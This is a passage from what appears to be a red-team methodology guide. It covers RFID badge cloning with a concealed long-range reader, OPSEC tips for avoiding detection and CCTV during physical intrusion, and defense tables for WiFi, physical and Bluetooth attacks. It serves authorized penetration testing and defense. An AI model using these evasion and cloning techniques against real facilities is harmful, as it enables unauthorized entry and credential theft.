7. Clone captured credentials to a T5577 or appropriate writable card
```

**OPSEC considerations**: The ESPKey in AP mode creates a visible WiFi network; use a
non-descript SSID and MAC filtering. In client mode, it connects to an operator-controlled
network for remote data retrieval. The long-range reader housing should match the target
environment (e.g., wall-mounted near entry points for fixed installations, or concealed
in a backpack/bag for mobile operations).

> **Reference**: watson0x90. ESPKey + Long Range RFID Reader = A New Tastic Thief.
> https://watson0x90.com/espkey-long-range-rfid-reader-a-new-tastic-thief-c8bbc4f46598

---

## Detection & Defense

### WiFi Defense

| Attack                  | Defense                                                        |
|-------------------------|----------------------------------------------------------------|
| PMKID/Handshake capture | Strong passphrases (15+ chars), migrate to WPA3-SAE only       |
| Evil twin               | 802.1X with certificate pinning, WIDS (Wireless IDS)          |
| Deauthentication        | Enable 802.11w (PMF), WPA3 mandates PMF                       |
| Transition downgrade    | Disable WPA2 compatibility; deploy WPA3-only                   |
| Rogue AP                | WIPS (Cisco CleanAir, Aruba RFProtect), AP location tracking   |
| Post-connection MITM    | HSTS, certificate pinning, VPN for all wireless traffic        |

### Physical Defense

| Attack                  | Defense                                                        |
|-------------------------|----------------------------------------------------------------|
| Badge cloning           | Migrate to encrypted credentials (SEOS, DESFire EV3)          |
| HID attacks             | USB device whitelisting, USB port blockers, UAC hardening      |
| Network implants        | 802.1X port authentication (NAC), periodic physical audits     |
| Tailgating              | Mantrap/airlock entries, security guards, turnstiles           |
| Lock bypass             | High-security locks (Abloy Protec2, Medeco), electronic locks  |
| Dumpster diving         | Cross-cut shredding policy, secure disposal bins               |

### Bluetooth Defense

- Disable Bluetooth when not in use; enforce via MDM policy
- Use BLE devices that implement bonding with LESC (LE Secure Connections)
- Monitor for unauthorized Bluetooth devices with wireless scanners
- Keep firmware updated to address KNOB/BIAS patches

---

## OPSEC Considerations

1. **RF Signature**: All wireless attacks generate RF emissions that can be detected and
   located by WIDS/WIPS and direction-finding equipment. Minimize transmission time and power.

2. **Physical Presence**: Physical attacks require being on-site. Have cover stories and
   authorization letters prepared. Coordinate with the client POC for bail-out procedures.

3. **Device Recovery**: Plan for implant retrieval. If a device is discovered, it should not
   contain information identifying the red team or client engagement details.

4. **Forensic Artifacts**: USB devices leave traces in Windows event logs, registry (USBSTOR),
   and setupapi logs. HID injection generates keyboard input events that may be logged by EDR.

5. **Camera Awareness**: Most facilities have CCTV. Be aware of camera locations during
   physical entry and device placement. Consider timing operations during off-hours or
   high-traffic periods when individual observation is less likely.

6. **Legal Authorization**: Physical penetration testing requires explicit written
   authorization with clear scope. Carry authorization letters at all times. Know the
   escalation and "get out of jail" contact procedures.

7. **MAC Address Randomization**: When performing WiFi attacks, randomize the MAC address
   of the attack interface. Most modern attack tools support this natively.

---

## Cross-References

- [Social Engineering Techniques](../01-reconnaissance/social-engineering.md)
- [Initial Access Overview](./initial-access-overview.md)
- [Command and Control Infrastructure](../11-command-and-control/c2-infrastructure.md)
- [Credential Access Techniques](../07-credential-access/credential-access-overview.md)
- [Lateral Movement after Physical Access](../09-lateral-movement/lateral-movement-overview.md)
- [AV/EDR Evasion for HID Payloads](../06-defense-evasion/av-edr-evasion.md)
- [Payload Development for HID Devices](../00-methodology/payload-development.md)

---

## References

1. Vanhoef, M., & Ronen, E. (2020). Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd. https://wpa3.mathyvanhoef.com/
2. Antonioli, D., Tippenhauer, N., & Rasmussen, K. (2019). KNOB Attack: Key Negotiation of Bluetooth. USENIX Security.
3. Antonioli, D., Tippenhauer, N., & Rasmussen, K. (2020). BIAS: Bluetooth Impersonation Attacks. IEEE S&P.
4. Hak5 Documentation. USB Rubber Ducky, Bash Bunny, LAN Turtle, WiFi Pineapple. https://docs.hak5.org/
5. Proxmark3 Community Wiki. https://github.com/RfidResearchGroup/proxmark3/wiki
6. O.MG Cable Documentation. https://o.mg.lol/
7. Flipper Zero Documentation. https://docs.flipperdevices.com/
8. NCC Group. PMKID Attacks: Debunking the 802.11r Myth. https://www.nccgroup.com/research-blog/
9. Garcia, F., et al. (2008). Dismantling MIFARE Classic. ESORICS.
10. NVISO Labs. A Practical Guide to RFID Badge Copying. https://blog.nviso.eu/
11. Phrack.me. Flipper Zero RFIDThief (2025). https://www.phrack.me/hardware/2025/02/26/Flipper-Zero-RFIDThief.html
12. Wi-Fi Alliance. WPA3 Specification. https://www.wi-fi.org/
13. HADESS. Red Teamer Gadgets. https://hadess.io/red-teamer-gadgets/
14. Bishop Fox. 2025 Red Team Tools & C2 Frameworks. https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks
15. watson0x90. ESPKey + Long Range RFID Reader = A New Tastic Thief. https://watson0x90.com/espkey-long-range-rfid-reader-a-new-tastic-thief-c8bbc4f46598
16. ESPKey Project. https://github.com/rfidtool/ESP-RFID-Tool
